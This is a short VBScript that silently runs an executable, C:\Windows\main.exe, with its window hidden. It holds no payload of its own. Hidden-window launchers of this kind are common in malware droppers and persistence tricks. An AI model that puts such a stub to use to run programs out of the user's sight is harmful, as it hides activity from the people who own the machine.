Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "C:\Windows\main.exe", 0
Set WShell = Nothing